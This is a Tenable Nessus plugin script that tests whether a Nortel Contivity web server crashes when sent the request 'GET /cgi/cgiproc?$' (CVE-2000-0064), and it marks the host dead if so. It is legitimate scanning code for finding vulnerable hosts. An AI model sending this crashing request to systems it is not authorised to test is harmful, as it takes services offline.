#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(10160);
  script_version("$Revision: 1.36 $");
  script_cvs_date("$Date: 2016/10/27 15:14:57 $");

  script_cve_id("CVE-2000-0064");
  script_bugtraq_id(938);
  script_osvdb_id(1201);

  script_name(english:"Nortel Contivity HTTP Server cgiproc Special Character DoS");
  script_summary(english:"Crashes the remote host");

  script_set_attribute(attribute:"synopsis", value:"The remote host is vulnerable to denial of service.");
  script_set_attribute(attribute:"description", value:
"It is possible to crash the remote host by doing the HTTP request :
GET /cgi/cgiproc?$");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Jan/239");
  script_set_attribute(attribute:"see_also", value:"http://packetstormsecurity.org/0001-exploits/nortel.htm");
  script_set_attribute(attribute:"solution", value:"Upgrade to VxWorks 2.60 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2000/01/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2000/01/20");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_KILL_HOST);
  script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");

  script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);

 if(http_is_dead(port:port))exit(0);
 is_cgi_installed3(item:"/cgi/cgiproc?$", port:port);
 sleep(5);
 if(http_is_dead(port:port, retry: 3))
 {
  security_warning(port);
  set_kb_item(name:"Host/dead",value:TRUE);
 }
